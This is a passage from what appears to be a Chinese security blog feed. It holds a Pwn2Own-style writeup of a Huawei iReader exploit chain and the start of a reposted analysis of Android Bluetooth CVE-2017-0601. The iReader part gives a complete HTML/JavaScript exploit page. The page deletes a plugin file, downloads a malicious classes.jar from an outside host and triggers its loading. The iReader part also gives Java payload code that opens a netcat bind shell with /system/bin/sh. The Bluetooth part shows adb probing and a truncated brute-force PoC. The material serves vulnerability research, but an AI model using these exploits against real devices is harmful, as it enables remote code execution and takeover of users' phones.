if(Utils.getEMUISDKINT() &gt;= 14) &#123;</span></span><br><span class="line"><span class="comment">            PATH.HW_ROOT_DIR = PATH.HW_ROOT_DIR_ABOVE_EMUI6_0;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getStorageDir</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SDCARD.a();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String v0 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!TextUtils.isEmpty(SDCARD.b)) &#123;</span><br><span class="line">            v0 = SDCARD.b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(SDCARD.hasSdcard()) &#123;</span><br><span class="line">            v0 = Environment.getExternalStorageDirectory().toString();</span><br><span class="line">            SDCARD.b = v0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> v0 + <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据以上代码,也即是存在路径**/sdcard/HWiReader/books/.openfail/md5(fileName)**即可实现删除任意文件。</p><h4 id="不安全组件加载"><a href="#不安全组件加载" class="headerlink" title="不安全组件加载"></a>不安全组件加载</h4><p>寻找不安全的组件加载漏洞,挖掘思路自然是需要分析应用的目录结构,我们通过查看sdcard和data/沙盒中有关iReader应用的目录,查看是否有加载so/dex/jar等等需要动态加载的组件。</p><p>经过分析，我们找到**/sdcard/HWiReader/plugins/DFService/classes.jar**,接下来自然是全局搜索相关字符串关键词,定位到加载该组件的地方。最终定位为:<strong>com.zhangyue.iReader.tools.Util</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bk.p</span></span><br><span class="line"> <span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> ArrayList <span class="title">P</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    Object v2 = Util.loadPlug(APP.getAppContext(), v3.getPlugDir(<span class="string">&quot;DFService&quot;</span>) + <span class="string">&quot;classes.jar&quot;</span>, <span class="string">&quot;com.zhangyue.iReader.Plug.Service.DocFeature&quot;</span>).newInstance();</span><br><span class="line">    ...        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//com.zhangyue.iReader.tools.Util</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title">loadPlug</span><span class="params">(Context arg4, String arg5, String arg6)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">new</span> DexClassLoader(arg5, arg4.getApplicationInfo().dataDir, <span class="keyword">null</span>, arg4.getClassLoader()).loadClass(arg6);</span><br><span class="line">&#125;</span><br><span class="line">       </span><br></pre></td></tr></table></figure><p>接下来需要解决两个问题:</p><ol><li><p>加载classes.jar,并且初始化的类怎么去构造？</p><p> 这个只需查看loadClass(arg6),传进来的参数是什么即可。很显然，这里为<strong>com.zhangyue.iReader.Plug.Service.DocFeature</strong></p></li><li><p>怎么让iReader App去加载这个jar文件？</p><p> 这一步骤只需往前追溯调用链即可寻找到触发点。<br> 最终的触发点为:下载txt文件。</p></li></ol><h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><h4 id="前面两部分的漏洞利用分析"><a href="#前面两部分的漏洞利用分析" class="headerlink" title="前面两部分的漏洞利用分析"></a>前面两部分的漏洞利用分析</h4><ul><li><p><a href="http://www.freebuf.com/terminal/172780.html">Pwn2Own华为HiApp漏洞原理与利用分析(上)</a></p></li><li><p><a href="http://www.freebuf.com/vuls/173921.html">Pwn2Own华为HiApp漏洞原理与利用分析(下)</a></p></li></ul><h4 id="第三阶段的漏洞利用exploit代码如下"><a href="#第三阶段的漏洞利用exploit代码如下" class="headerlink" title="第三阶段的漏洞利用exploit代码如下:"></a>第三阶段的漏洞利用exploit代码如下:</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt; exploit iReader stage <span class="number">3</span> &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 首先构造任意文件删除攻击连</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_hash</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">var</span>  HASH_FILE_ID = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">   <span class="keyword">var</span>  HASH_URI = <span class="string">&#x27;http://www.tasfa.cn/classes.jar&#x27;</span>;</span><br><span class="line">   <span class="keyword">var</span> json =<span class="string">&#x27;&#123;&quot;Action&quot;:&quot;onlineReader&quot;,&quot;Data&quot;:&#123;&quot;Charging&quot;:&#123;&quot;FeeType&quot;:0,&quot;OrderUrl&quot;:&quot;http://192.168.137.1:8001/aaaaa&quot;,&quot;Price&quot;:&quot;0&quot;&#125;,&quot;DownloadInfo&quot;:&#123;&quot;ChapterId&quot;:&quot;1&quot;,&quot;FeeUnit&quot;:10,&quot;Type&quot;:&quot;1&quot;,&quot;FileId&quot;:&quot;&#x27;</span>+ HASH_FILE_ID +<span class="string">&#x27;&quot;,&quot;FileName&quot;:&quot;.openfail/5457bea93d0548a4d84357308df45322&quot;,&quot;FileSize&quot;:10000000,&quot;Ebk3DownloadUrl&quot;:&quot;&#x27;</span> + HASH_URI + <span class="string">&#x27;&quot;,&quot;DownloadUrl&quot;:&quot;&#x27;</span> + HASH_URI + <span class="string">&#x27;&quot;,&quot;Version&quot;:&quot;2&quot;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line">   <span class="built_in">window</span>.ZhangYueJS.do_command(json);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delete_file</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">var</span> json = <span class="string">&#x27;&#123;&quot;Action&quot;:&quot;chapPackDownload&quot;,&quot;Data&quot;:&#123; &quot;StartIndex&quot;: 0, &quot;EndIndex&quot; : 0,&quot;Price&quot; : &quot;0&quot;, &quot;BookId&quot; : 0, &quot;PayURL&quot; : 0, &quot;DownloadURL&quot; : &quot;aaa&quot;, &quot;FileName&quot; :&quot;../plugins/DFService/classes.jar&quot; &#125; &#125;&#x27;</span>;</span><br><span class="line">   <span class="built_in">window</span>.ZhangYueJS.do_command(json);</span><br><span class="line">   download_plugin();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//下载不安全加载组件classes.jar</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download_plugin</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">var</span> PLUGIN_URI = <span class="string">&quot;http://www.tasfa.cn/classes.jar&quot;</span>;</span><br><span class="line"> <span class="keyword">var</span> PLUGIN_FILE_ID = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> json =<span class="string">&#x27;&#123;&quot;Action&quot;:&quot;onlineReader&quot;,&quot;Data&quot;:&#123;&quot;Charging&quot;:&#123;&quot;FeeType&quot;:0,&quot;OrderUrl&quot;:&quot;http://192.168.137.1:8001/aaaaa&quot;,&quot;Price&quot;:&quot;0&quot;&#125;,&quot;DownloadInfo&quot;:&#123;&quot;ChapterId&quot;:&quot;1&quot;,&quot;FeeUnit&quot;:10,&quot;Type&quot;:&quot;1&quot;,&quot;FileId&quot;:&quot;&#x27;</span> + PLUGIN_FILE_ID + <span class="string">&#x27;&quot;,&quot;FileName&quot;:&quot;../plugins/DFService/classes.jar&quot;,&quot;FileSize&quot;:10000000,&quot;Ebk3DownloadUrl&quot;:&quot;&#x27;</span> + PLUGIN_URI + <span class="string">&#x27;&quot;,&quot;DownloadUrl&quot;:&quot;&#x27;</span> + PLUGIN_URI + <span class="string">&#x27;&quot;,&quot;Version&quot;:&quot;2&quot;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="built_in">window</span>.ZhangYueJS.do_command(json);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> TEXT_FILE_ID = <span class="string">&quot;334455&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> TEXT_FILE_NAME = <span class="string">&quot;../plugins/DFService/test.txt&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> TEXT_URI = <span class="string">&quot;http://www.tasfa.cn/test.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//触发组件进行加载</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download_text</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> json = <span class="string">&#x27;&#123;&quot;Action&quot;:&quot;readNow&quot;,&quot;Data&quot;:&#123;&quot;Charging&quot;:&#123;&quot;FeeType&quot;:0,&quot;OrderUrl&quot;:&quot;http://192.168.137 .1:8001/aaaaa&quot;,&quot;Price&quot;:&quot;0&quot;&#125;,&quot;DownloadInfo&quot;:&#123;&quot;ChapterId&quot;:&quot;1&quot;,&quot;FeeUnit&quot;:10,&quot;Type&quot;:&quot;1&quot; ,&quot;FileId&quot;:&quot;&#x27;</span> + TEXT_FILE_ID + <span class="string">&#x27;&quot;,&quot;FileName&quot;:&quot;&#x27;</span> + TEXT_FILE_NAME + <span class="string">&#x27;&quot;,&quot;FileSize&quot;:10000000,&quot;Ebk3DownloadUrl&quot;:&quot;&#x27;</span> + TEXT_URI + <span class="string">&#x27;&quot;,&quot;DownloadUrl&quot;:&quot;&#x27;</span> + TEXT_URI + <span class="string">&#x27;&quot;,&quot;Version&quot;:&quot;2&quot;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="built_in">window</span>.ZhangYueJS.do_command(json);</span><br><span class="line"><span class="built_in">setTimeout</span>(trigger_plugin_load,<span class="number">5000</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//触发payload执行</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger_plugin_load</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> json = <span class="string">&#x27;&#123;&quot;Action&quot;:&quot;readNow&quot;,&quot;Data&quot;:&#123;&quot;Charging&quot;:&#123;&quot;FeeType&quot;:0,&quot;OrderUrl&quot;:&quot;http://192.168.137 .1:8001/aaaaa&quot;,&quot;Price&quot;:&quot;0&quot;&#125;,&quot;DownloadInfo&quot;:&#123;&quot;ChapterId&quot;:&quot;1&quot;,&quot;FeeUnit&quot;:10,&quot;Type&quot;:&quot;1&quot; ,&quot;FileId&quot;:&quot;&#x27;</span> + TEXT_FILE_ID + <span class="string">&#x27;&quot;,&quot;FileName&quot;:&quot;&#x27;</span> + TEXT_FILE_NAME + <span class="string">&#x27;&quot;,&quot;FileSize&quot;:10000000,&quot;Ebk3DownloadUrl&quot;:&quot;&#x27;</span> + TEXT_URI + <span class="string">&#x27;&quot;,&quot;DownloadUrl&quot;:&quot;&#x27;</span> + TEXT_URI + <span class="string">&#x27;&quot;,&quot;Version&quot;:&quot;2&quot;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="built_in">window</span>.ZhangYueJS.do_command(json); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">create_hash();</span><br><span class="line">delete_file();</span><br><span class="line"><span class="built_in">setTimeout</span>(download_text,<span class="number">15000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exploit();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure><p>这里要注意两个点:</p><ol><li>setTimeout所延迟的时间必须是根据自己VPS连接速度来设定。</li><li>里面有两个FILE_ID，必须保证对应相等。</li></ol><h4 id="classes-jar构造Payload如下"><a href="#classes-jar构造Payload如下" class="headerlink" title="classes.jar构造Payload如下:"></a>classes.jar构造Payload如下:</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhangyue.iReader.Plug.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DocFeature</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DocFeature</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        run();</span><br><span class="line">        Log.e(<span class="string">&quot;ATTACKER&quot;</span>,<span class="string">&quot;RUNNING ARBITRARY CODE!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String command = <span class="string">&quot;nc -l -p 28888 -e /system/bin/sh&quot;</span>;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            runtime.exec(command);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Build后,在Android Studio工程下,找到**/app/build/intermediates/classes/debug**目录,然后执行以下命令生成jar.</p><p><code>dx --dex --output=/Downloads/classes.jar com/zhangyue/iReader/Plug/Service/DocFeature.class</code></p><p>这里有小坑:</p><ol><li>代码中由于classpath的原因,因此无法在代码中直接使用new Thread去创建线程。</li><li>执行dx命令时,必须是在完整的结构目录路径下。 </li><li>nc命令需要下载busyBox.</li></ol><h4 id="漏洞利用效果"><a href="#漏洞利用效果" class="headerlink" title="漏洞利用效果"></a>漏洞利用效果</h4><p><img src="/Users/tasfa/Desktop/%E6%A1%8C%E9%9D%A2/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/APP%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E4%B8%BAIReader%E6%BC%8F%E6%B4%9E/last.gif"> </p><p>备注: 完整的利用视频时间较长,因此剪辑掉等待的部分。  </p><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><ol><li>诱导用户访问恶意网站(exploit.html)</li><li>使用DNS劫持或其他方式,绕过internal_webview的域名白名单限制,使其加载恶意页面(exploit2.html)</li><li>从而调用起iReader的ActivityWeb,使其加载恶意攻击页面(exploit3.html)</li><li>exploit3.html首先删除可被控制的classes.jar（任意删除文件漏洞）</li><li>接着下载恶意的classes.jar（任意下载文件漏洞）</li><li>最后使用下载txt文件的方式触发App加载classes.jar（不安全组件加载）</li><li>最终触发payload执行,攻击者获取权限.</li></ol><h3 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h3><p><a href="https://blog.csdn.net/u011068702/article/details/53263442">Android插件化开发之DexClassLoader动态加载dex、jar小Demo</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;p&gt;这部分漏洞分析属于之前MWR InfoSecurity的研究员报告中的第三部分,同样该报告仅有漏洞的简单描述，具体的PoC也未详细给出.&lt;/p&gt;
&lt;p&gt;因此本文的目的依旧是去探索漏洞挖掘的思路,以下不代表漏洞作者思路,欢迎更好的想法,欢迎讨论。&lt;/p&gt;
&lt;p&gt;ps: 附上2017 pwn2own mobile视频&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://youtu.be/4Oy7mBeOmDg&quot;&gt;视频需梯子&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Android漏洞" scheme="http://example.com/tags/Android%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>蓝牙App系列漏洞原理分析与漏洞利用</title>
    <link href="http://example.com/2018/10/01/%E8%93%9D%E7%89%99App%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>http://example.com/2018/10/01/%E8%93%9D%E7%89%99App%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2018-10-01T01:49:25.000Z</published>
    <updated>2021-05-22T13:10:54.208Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>作者: heeeeen</p><p>本文系转载，目的是学习，如有侵权，请联系删除</p><p>转载出处:<a href="http://www.ms509.com/">http://www.ms509.com/</a></p></blockquote><h2 id="蓝牙App漏洞系列分析之一CVE-2017-0601"><a href="#蓝牙App漏洞系列分析之一CVE-2017-0601" class="headerlink" title="蓝牙App漏洞系列分析之一CVE-2017-0601"></a>蓝牙App漏洞系列分析之一CVE-2017-0601</h2><h3 id="0x01-概要"><a href="#0x01-概要" class="headerlink" title="0x01 概要"></a>0x01 概要</h3><p>2017年5月的Android安全公告修复了我们提交的一个蓝牙提权中危漏洞，这个漏洞尽管简单，但比较有意思，能够使本地恶意App绕过用户交互，使用户强制接收外部传入的蓝牙文件。漏洞概要如下：</p><pre><code>CVE: CVE-2017-0601BugID: A-35258579严重性: 中影响的Google设备: AllUpdated AOSP versions: 7.0, 7.1.1, 7.1.2</code></pre><h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>蓝牙App暴露了一个广播接收器com.android.bluetooth.opp.BluetoothOppReceiver，本地普通App可以向这个Receiver发送广播，查看其OnReceive方法，包含了对多种传入广播Intent Action的处理，但是大多数Intent Action处于保护状态，简单用adb shell可以一一对其测试，比如</p><span id="more"></span><blockquote><p>adb shell am broadcast -a android.btopp.intent.action.OPEN</p></blockquote><p>提示如下错误，说明action处于保护状态</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Broadcasting: Intent &#123; act=android.btopp.intent.action.OPEN &#125;</span><br><span class="line">java.lang.SecurityException: Permission Denial: not allowed to send broadcast android.btopp.intent.action.OPEN from pid=26382, uid=2000</span><br><span class="line">     at android.os.Parcel.readException(Parcel.java:1683)</span><br><span class="line">     at android.os.Parcel.readException(Parcel.java:1636)</span><br><span class="line">     at android.app.ActivityManagerProxy.broadcastIntent(ActivityManagerNative.java:3507)</span><br><span class="line">     at com.android.commands.am.Am.sendBroadcast(Am.java:772)</span><br><span class="line">     at com.android.commands.am.Am.onRun(Am.java:404)</span><br><span class="line">     at com.android.internal.os.BaseCommand.run(BaseCommand.java:51)</span><br><span class="line">     at com.android.commands.am.Am.main(Am.java:121)</span><br><span class="line">     at com.android.internal.os.RuntimeInit.nativeFinishInit(Native Method)</span><br><span class="line">     at com.android.internal.os.RuntimeInit.main(RuntimeInit.java:262)</span><br></pre></td></tr></table></figure><p>但是android.btopp.intent.action.ACCEPT这个Intent Action，却没有保护</p><blockquote><p>adb shell am broadcast -a  android.btopp.intent.action.ACCEPT</p></blockquote><p>Broadcasting: Intent { act=android.btopp.intent.action.ACCEPT }<br>Broadcast completed: result=0</p><p>进一步分析AOSP代码，发现传入这个Action的Intent时，会将Intent携带Uri指向的db进行更新，更新为用户确认状态。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (action.equals(Constants.ACTION_ACCEPT)) &#123;</span><br><span class="line">           <span class="keyword">if</span> (V) Log.v(TAG, <span class="string">&quot;Receiver ACTION_ACCEPT&quot;</span>);</span><br><span class="line">           Uri uri = intent.getData();</span><br><span class="line">           ContentValues values = <span class="keyword">new</span> ContentValues();</span><br><span class="line">           values.put(BluetoothShare.USER_CONFIRMATION, BluetoothShare.USER_CONFIRMATION_CONFIRMED);</span><br><span class="line">           context.getContentResolver().update(uri, values, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">           cancelNotification(context, uri);</span><br></pre></td></tr></table></figure><p>这个db其实就是蓝牙文件共享的provider，对应的uri为content://con.android.bluetooth.opp/btopp，当通过蓝牙共享接收、发送文件时，该数据库都会增加新的条目，记录接收、发送的状态。该provider记录的信息可以参考BluetoothShare</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Exposes constants used to interact with the Bluetooth Share manager&#x27;s content</span></span><br><span class="line"><span class="comment">* provider.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@hide</span></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">BluetoothShare</span> <span class="keyword">implements</span> <span class="title">BaseColumns</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">BluetoothShare</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The permission to access the Bluetooth Share Manager</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String PERMISSION_ACCESS = <span class="string">&quot;android.permission.ACCESS_BLUETOOTH_SHARE&quot;</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The content:// URI for the data table in the provider</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Uri CONTENT_URI = Uri.parse(<span class="string">&quot;content://com.android.bluetooth.opp/btopp&quot;</span>);</span><br></pre></td></tr></table></figure><p>因此，如果我们在Intent中传入某个蓝牙共享对应文件的uri，那么它在蓝牙文件共享Provider中的状态就会被更改为用户确认状态。这里继续进行猜想，进一步，如果我们刚好通过蓝牙传入某个文件，将其状态改为用户确认，是否文件就无需确认，自动接收了呢？幸运的是，的确如此。</p><h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>这里还有一个问题要解决，content://com.android.bluetooth.opp/btopp只是整个provider的uri，我们如何知道刚刚通过蓝牙传入文件的uri呢？通过暴力穷举，下面的PoC简单地解决了这个问题，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    Button m_btnAccept = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String ACTION_ACCEPT = <span class="string">&quot;android.btopp.intent.action.ACCEPT&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String BLUETOOTH_SHARE_URI = <span class="string">&quot;content://com.android.bluetooth.opp/btopp/&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        m_btnAccept = (Button)findViewById(R.id.accept);</span><br><span class="line">        m_btnAccept.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">                intent.setComponent(<span class="keyword">new</span> ComponentName(<span class="string">&quot;com.android.bluetooth&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;com.android.bluetooth.opp.BluetoothOppReceiver&quot;</span>));</span><br><span class="line">                intent.setAction(ACTION_ACCEPT);</span><br><span class="line">                <span class="comment">// Guess the incoming bluetooth share uri, normally it increases from 1 by 1 and could be guessed easily.</span></span><br><span class="line">                <span class="comment">// Then Send broadcast to change the incoming file status</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">255</span>; i++) 